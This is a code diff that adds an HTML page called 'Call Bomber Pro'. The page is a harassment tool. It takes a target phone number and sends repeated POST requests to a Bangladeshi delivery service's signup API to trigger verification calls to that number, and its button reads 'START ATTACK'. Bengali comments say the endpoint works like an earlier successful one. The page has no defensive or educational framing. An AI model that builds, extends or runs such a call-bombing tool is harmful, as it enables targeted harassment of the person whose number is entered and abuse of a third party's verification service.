@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Bomber Pro</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: #ff0000; font-family: monospace; overflow: hidden; }
+        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
+        .container { text-align: center; margin-top: 15%; background: rgba(0,0,0,0.8); padding: 20px; border: 1px solid #ff0000; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); }
+        input { background: #000; color: #ff0000; border: 1px solid #ff0000; padding: 10px; margin: 5px; width: 200px; text-align: center; }
+        button { background: #ff0000; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        #display { margin-top: 20px; font-size: 1.2em; }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    <div class="container">
+        <h1>CALL BOMBER</h1>
+        <input type="text" id="target" placeholder="Target Number (e.g. 017...)"><br>
+        <input type="number" id="count" placeholder="Call Amount (Max 10)"><br>
+        <button onclick="startProcess()">START ATTACK</button>
+        <div id="display">Ready for Attack</div>
+    </div>
+
+    <script>
+        async function startProcess() {
+            const target = document.getElementById('target').value;
+            const count = parseInt(document.getElementById('count').value);
+            const display = document.getElementById('display');
+
+            if(!target || !count) { display.innerText = "Enter target & amount!"; return; }
+            if(count > 10) { display.innerText = "Max limit is 10 calls!"; return; }
+
+            display.innerText = "Call Attack Started...";
+
+            for (let i = 1; i <= count; i++) {
+                try {
+                    // Call API যা আপনার আগে সফল হওয়া হোইচই এর মতই কার্যকর
+                    await fetch('https://api.redx.com.bd/api/v1/user/signup', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ "phone": target, "type": "call" }),
+                        mode: 'cors'
+                    });
+
+                    display.innerText = "Call Sent: " + i;
+                    // কল প্রসেসিং এর জন্য ৩০ সেকেন্ড বিরতি
+                    await new Promise(res => setTimeout(res, 30000)); 
+                } catch (e) {
+                    console.log("Error skipped...");
+                }
+            }
+            display.innerText = "Attack Completed!";
+        }
+
+        // Matrix Effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "010101"; const fontSize = 16;
+        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#ff0000"; ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 33);
+    </script>
+</body>
+</html>
